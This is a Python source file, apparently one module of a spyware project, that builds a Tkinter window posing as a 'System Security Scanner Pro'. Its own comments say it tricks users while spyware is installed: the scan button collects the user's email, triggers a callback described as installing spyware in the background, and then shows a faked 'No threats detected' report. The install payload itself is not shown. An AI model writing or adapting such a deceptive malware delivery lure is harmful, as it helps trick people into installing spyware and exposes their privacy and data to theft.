"""
Delivery Function 1: Show Spyware GUI
Displays fake "System Security Scanner" to trick user while installing spyware
"""

import tkinter as tk
from tkinter import messagebox
import threading
import time

def show_spyware_gui(on_scan_callback):
    """
    Display fake security scanner GUI to deliver spyware
    Args:
        on_scan_callback: Function to call when user clicks scan button (installs spyware)
    """
    print("[Spyware] Function 1: Showing fake security scanner GUI...")
    
    global scan_window, email_entry
    
    scan_window = tk.Tk()
    scan_window.title("System Security Scanner Pro")
    scan_window.geometry("600x400")
    scan_window.resizable(False, False)
    scan_window.configure(bg='white')
    
    # Professional header
    header_frame = tk.Frame(scan_window, bg='#0052CC', height=80)
    header_frame.pack(fill='x')
    
    title_label = tk.Label(header_frame, text="🛡️ System Security Scanner", 
                          font=("Segoe UI", 20, "bold"),
                          bg='#0052CC', fg='white')
    title_label.pack(pady=25)
    
    # Main content
    content_frame = tk.Frame(scan_window, bg='white')
    content_frame.pack(fill='both', expand=True, padx=40, pady=30)
    
    info_label = tk.Label(content_frame, 
                         text="Comprehensive Security Analysis Tool\n\n"
                              "This scanner will perform a deep system check:\n"
                              "✓ Malware and virus detection\n"
                              "✓ Privacy vulnerability assessment\n"
                              "✓ System file integrity verification\n\n"
                              "Email notification (optional):",
                         font=("Segoe UI", 10),
                         bg='white', fg='#333',
                         justify='left')
    info_label.pack(pady=20)
    
    email_entry = tk.Entry(content_frame, width=45, font=("Segoe UI", 11))
    email_entry.pack(pady=10)
    email_entry.insert(0, "your.email@example.com")
    
    def on_scan_clicked():
        user_email = email_entry.get().strip()
        
        # Show scanning progress
        messagebox.showinfo("Scanner", "Starting comprehensive system scan...\nThis may take a few moments.")
        
        # Call the callback function (installs spyware in background)
        on_scan_callback(user_email if user_email and '@' in user_email else None)
        
        # Simulate scanning
        time.sleep(2)
        
        # Show fake "clean" result
        messagebox.showinfo("Scan Complete", 
                          "✓ System scan completed successfully!\n\n"
                          "Status: No threats detected\n"
                          "Files scanned: 47,392\n"
                          "Time elapsed: 2.3 seconds\n\n"
                          "Your system is secure.")
        
        # Close window after a moment
        scan_window.after(1500, scan_window.destroy)
    
    scan_button = tk.Button(content_frame, text="🔍 Start Security Scan", 
                           command=on_scan_clicked, 
                           bg="#0052CC", fg="white",
                           font=("Segoe UI", 12, "bold"),
                           width=30, height=2,
                           cursor="hand2")
    scan_button.pack(pady=25)
    
    disclaimer_label = tk.Label(content_frame, 
                               text="Trusted by millions worldwide • Free security tool",
                               font=("Segoe UI", 8),
                               bg='white', fg='#999')
    disclaimer_label.pack(pady=10)
    
    return scan_window
